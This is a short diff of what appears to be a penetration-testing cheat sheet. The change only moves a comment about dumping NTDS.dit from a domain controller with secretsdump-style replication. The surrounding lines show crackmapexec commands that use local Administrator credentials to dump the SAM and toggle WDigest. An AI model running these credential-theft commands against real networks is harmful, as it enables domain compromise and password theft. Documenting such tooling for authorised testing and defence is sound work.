@@ -49,8 +49,10 @@ crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
 crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
 crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
 
-# Dump the NTDS.dit from DC using methods from secretsdump.py
 
+
+
+# Dump the NTDS.dit from DC using methods from secretsdump.py
 # Uses drsuapi RPC interface create a handle, trigger replication
 # and combined with additional drsuapi calls to convert the resultant 
 # linked-lists into readable format
